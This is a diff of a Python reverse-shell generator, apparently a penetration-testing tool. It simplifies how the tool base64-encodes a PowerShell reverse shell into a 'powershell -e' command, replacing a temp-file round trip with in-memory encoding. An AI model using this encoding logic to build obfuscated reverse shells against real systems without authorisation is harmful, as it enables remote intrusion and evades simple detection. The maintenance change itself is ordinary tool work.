@@ -16,7 +16,6 @@ import sys
 import json
 import socket
 import base64
-import tempfile
 import signal
 import ipaddress
 import os
@@ -232,15 +231,9 @@ def main():
             shell = revshell['command'].replace('{LHOST}', args.LHOST).replace('{LPORT}', args.LPORT)
             comment = revshell['comments'].strip()
             if args.TYPE == "powershell" and shell_index == 4:
-                # Create and write the generated base64 encoded PowerShell reverse shell into a temporary file
-                with tempfile.NamedTemporaryFile(delete=False, mode="w", encoding="utf-8") as tmp_file:
-                    tmp_file.write(revshells[args.TYPE][0]['command'].replace("'",'"').replace('{LHOST}', args.LHOST).replace('{LPORT}', args.LPORT))
-                with open(tmp_file.name, encoding='utf-8') as f:
-                    data = f.read()
-                    shell_utf16 = data.encode('utf-16le')
-                    # pwsh_base64_revshell
-                    shell = "powershell -e " + base64.b64encode(shell_utf16).decode()
-                os.remove(tmp_file.name)
+                shell_utf16 = revshells[args.TYPE][0]['command'].replace("'",'"').replace('{LHOST}', args.LHOST).replace('{LPORT}', args.LPORT).encode('utf-16le')
+                # pwsh_base64_revshell
+                shell = "powershell -e " + base64.b64encode(shell_utf16).decode()
             if shell:
                 print(format_shell(shell_index, shell, comment))
         # Display listeners
